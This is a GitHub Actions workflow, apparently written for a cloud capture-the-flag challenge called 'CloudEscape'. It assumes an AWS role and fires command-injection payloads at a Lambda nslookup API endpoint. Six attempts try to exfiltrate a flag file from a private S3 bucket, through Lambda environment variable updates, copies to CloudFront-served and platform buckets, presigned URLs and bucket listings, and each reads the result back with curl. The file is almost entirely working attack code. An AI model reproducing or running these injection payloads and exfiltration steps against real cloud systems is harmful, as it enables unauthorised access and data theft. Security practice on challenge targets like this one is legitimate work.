name: CloudEscape Stage 1 - Exfil Flag
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      # ── 1. Inject command: copy flag to flag.txt on Lambda /tmp ──
      # Then put it into Lambda env vars so we can read via get-function-configuration
      - name: Trigger Lambda - Exfil via Env Vars
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # First: copy flag to /tmp and capture it, then update Lambda's own env vars
          # The Lambda has aws_cli_layer so aws CLI is available at /opt/aws
          # We need to find the aws binary path. Let's try /opt/aws/bin/aws or just aws
          
          echo "===== Attempt A: Exfil via Lambda env var update ====="
          # First read the flag, then update this Lambda's own env
          PAYLOAD='{"domain": "x; FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/f.txt 2>/dev/null && cat /tmp/f.txt | tr -d \"\\n\"); aws lambda update-function-configuration --function-name nslookupv2 --environment \"Variables={EXFIL=$FLAG}\" 2>&1"}'
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
          
          sleep 5

          echo ""
          echo "===== Read Lambda config for exfiltrated flag ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1 | jq '.Environment.Variables' 2>/dev/null || aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1

      # ── 2. Also try: copy flag to CloudFront-served site bucket ──
      - name: Trigger Lambda - Exfil via CloudFront site bucket
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          echo "===== Attempt B: Copy flag to site bucket (CloudFront origin) ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt"}' 2>&1
          
          sleep 8
          
          echo ""
          echo "===== Read flag via CloudFront ====="
          curl -s "https://d67nf28gqfurd.cloudfront.net/flag.txt" 2>&1

      # ── 3. Try: copy flag to platform bucket with different approaches ──
      - name: Trigger Lambda - Exfil via platform bucket
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          echo "===== Attempt C: Copy to platform bucket ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/f.txt"}' 2>&1
          
          sleep 5
          
          echo ""
          echo "===== Read flag from platform bucket ====="
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/f.txt" 2>&1

      # ── 4. Try: use aws s3 presign to create a public URL ──
      - name: Trigger Lambda - Presign URL approach
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          echo "===== Attempt D: Presign URL for flag ====="
          # The Lambda might be able to generate a presigned URL for the flag
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; aws s3 presign s3://codec4f26c862a321ef5/flag.txt --expires-in 3600 > /tmp/presign.txt; aws s3 cp /tmp/presign.txt s3://platform-bucket-009661764077-us-east-1/presign.txt"}' 2>&1
          
          sleep 5
          
          echo ""
          echo "===== Read presigned URL from platform bucket ====="
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/presign.txt" 2>&1

      # ── 5. Try: Lambda can list what it sees and tell us via writing to platform bucket ──
      - name: Trigger Lambda - List buckets and write to platform
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          echo "===== Attempt E: List S3 and exfil to platform bucket ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; aws s3 ls > /tmp/ls.txt; aws s3 cp /tmp/ls.txt s3://platform-bucket-009661764077-us-east-1/ls.txt"}' 2>&1
          
          sleep 5
          
          echo ""
          echo "===== Read ls.txt from platform bucket ====="
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/ls.txt" 2>&1

      # ── 6. Also try: write flag content to CloudFront site bucket as index.html override ──
      - name: Trigger Lambda - Write flag as CloudFront index
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          echo "===== Attempt F: Write flag to site bucket as exfil.html ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/exfil.html"}' 2>&1
          
          sleep 8
          
          echo ""
          echo "===== Read exfil.html via CloudFront ====="
          curl -s "https://d67nf28gqfurd.cloudfront.net/exfil.html" 2>&1

      # ── 7. Final check: Read Lambda env vars (in case any exfil worked) ──
      - name: Final Lambda Config Check
        run: |
          echo "===== Final Lambda Config ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1